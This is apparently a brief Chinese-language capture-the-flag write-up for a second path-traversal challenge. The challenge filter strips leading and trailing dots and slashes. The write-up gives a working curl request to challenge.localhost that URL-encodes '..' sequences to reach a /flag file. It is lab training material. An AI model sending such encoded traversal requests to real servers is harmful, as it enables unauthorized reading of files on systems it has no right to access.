#路径遍历2
#这下好，做完一道又是3小时，于是发现了前面题解的一点点瑕疵，这辈子有了
#不再复述，这道题相比上一题的区别，便是对路径 'path.strip("./")'了，意思便是开头，结尾不允许有'.'或'/'而且这道题相比上一道，多了一个深层的文件，暂且定做'secret'
#这一次，你要在secret目录下，遍历到'/'的'flag'文件。

对'..'进行encode即可

curl -v "http://challenge.localhost:80/fortunes/%2E%2E/%2E%2E/%2E%2E/flag"
